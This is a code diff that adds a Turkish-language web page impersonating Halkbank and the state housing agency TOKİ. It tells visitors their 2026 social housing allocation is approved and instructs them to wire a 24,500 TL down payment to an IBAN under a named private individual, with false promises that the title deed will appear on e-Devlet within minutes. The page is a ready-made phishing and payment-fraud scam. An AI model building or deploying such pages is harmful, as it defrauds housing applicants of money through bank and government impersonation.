@@ -1,1 +1,50 @@
-
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOKİ Peşinat Tahsilat Ekranı | HALKBANK</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .official-badge { background: #004a99; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+        .iban-highlight { background: #fff8e1; border: 2px dashed #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0; }
+        .name-style { font-size: 22px; color: #333; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+    <div class="navbar">HALKBANK | TOKİ Kurumsal Tahsilat Sistemi</div>
+    <div class="container">
+        <div class="success-box">TEBRİKLER: 2026 SOSYAL KONUT TAHSİSİNİZ ONAYLANDI!</div>
+        
+        <table class="info-table">
+            <tr><td><b>Hak Sahibi Durumu:</b></td><td><span class="official-badge">ASİL HAK SAHİBİ</span></td></tr>
+            <tr><td><b>Konut Tipi:</b></td><td>3+1 / 2+1 Karma Proje</td></tr>
+            <tr><td><b>Tahsis Onay Kodu:</b></td><td>TK-8842710</td></tr>
+        </table>
+        
+        <div class="payment-box">
+            <h3 style="color:#004a99; margin-top:0;">Tapu Tescil ve Peşinat Talimatı</h3>
+            <p style="font-size:14px;">Konutunuzun e-Devlet sisteminde adınıza tescil edilmesi için aşağıda belirtilen <b>Halkbank Lisanslı Tahsilat Yetkilisi</b> hesabına peşinat bedelinin yatırılması gerekmektedir.</p>
+            
+            <div class="iban-highlight">
+                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Tahsilat Birimi Sorumlusu:</span><br>
+                <b class="name-style">İSMAİL ARSLAN</b><br><br>
+                
+                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Halkbank Kurumsal IBAN:</span><br>
+                <b style="font-size: 17px; color: #d9534f; font-family: monospace;">TR31 0006 7010 0000 0048 8523 29</b><br><br>
+                
+                <span style="font-size: 11px; color: #666; text-transform: uppercase;">Yatırılacak Toplam Tutar:</span><br>
+                <b style="font-size: 24px; color: #004a99;">24.500,00 TL</b>
+            </div>
+            
+            <p class="warning">⚠️ ÖNEMLİ: EFT/Havale açıklama kısmına SADECE T.C. KİMLİK NUMARANIZI yazınız.</p>
+        </div>
+        
+        <p style="font-size:11px; color:#999; text-align:center; margin-top:15px; line-height:1.4;">
+            * Bu ödeme Halkbank Genel Müdürlüğü denetimindeki emanet hesaplara aktarılmaktadır. Ödeme sonrası 15 dakika içinde e-Devlet 'Tapu Bilgileri Sorgulama' ekranınız güncellenecektir.
+        </p>
+        
+        <button onclick="alert('Ödeme sistem tarafından sorgulanıyor... Lütfen transferi yaptıktan sonra sayfayı kapatmayınız.')">ÖDEMEYİ SİSTEME BİLDİR</button>
+    </div>
+</body>
+</html>
